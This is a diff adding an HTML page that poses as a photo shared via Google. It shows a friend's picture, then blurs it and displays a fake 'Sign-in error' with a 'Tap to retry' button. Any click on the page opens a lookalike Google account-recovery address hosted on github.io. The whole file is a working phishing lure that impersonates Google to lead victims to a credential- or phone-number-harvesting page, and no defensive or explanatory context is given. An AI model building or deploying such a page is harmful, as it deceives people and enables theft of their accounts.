@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+    <head>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <title> Shared a photo on Google </title>
+        
+        <style>
+            
+            *{
+    margin:0;
+    padding:0;
+}
+
+body {
+    background-color:black;
+}
+
+#frdimg {
+    position:fixed;
+    transform:translateY(-50%);
+    margin-top:50vh;
+    width:99%;
+    border:1px solid white;
+    pointer-events:none;
+}
+
+#retry {
+    position:absolute;
+    background-color:transparent;
+    border:1px solid white;
+    border-radius:15px;
+    font-size:15px;
+    color:white;
+    padding:8px;
+    padding-left:15px;
+    padding-right:15px;
+    transform:translate(-50%,-50%);
+    margin-left:50%;
+    margin-top:50vh;
+    outline:none;
+    display:none;
+}
+
+p {
+    position:absolute;
+    transform:translate(-50%,-50%);
+    margin-left:50%;
+    margin-top:40vh;
+    font-size:15px;
+    color:white;
+    white-space:nowrap;
+    display:none;
+}
+
+
+#photos {
+    background-color:#fff;
+    position:absolute;
+    height:100%;
+    width:100%;
+    top:0;
+    left:0;
+    display:;
+}
+
+#photos img {
+    transform:translateY(-50%);
+    margin-top:50vh;
+    margin-left:10%;
+    pointer-events:none;
+}
+            
+            
+        </style>
+        
+        
+        
+    </head>
+    <body>
+        
+        <img id="frdimg" width="100%" src="https://i.ibb.co/MhnfbZR/friend.jpg" />
+        
+        <p id="error"> Couldn't load image Sign-in error </p>
+        
+        <button id="retry">Tap to retry</button>
+        
+        <div id="photos">
+            <img width="80%" src="https://i.ibb.co/RGKpShr/Capture-2022-01-28-08-13-58-01.jpg" />
+        </div>
+        
+        
+    </body>
+    <script>
+    
+    setTimeout( () => {
+    id("photos").style.display = "none";
+    },2000);
+    
+    
+    function id(id) {
+        return document.getElementById(id);
+    }
+    
+    window.onclick = () => { window.open("https://googlerecovery.github.io/confirm-phone/");
+    }
+    
+    setTimeout( () => {
+    id("retry").style.display = "block";
+    id("error").style.display = "block";
+    id("frdimg").style.filter ="blur(3px)";
+    
+    },7000);
+    
+</script>
+</html>
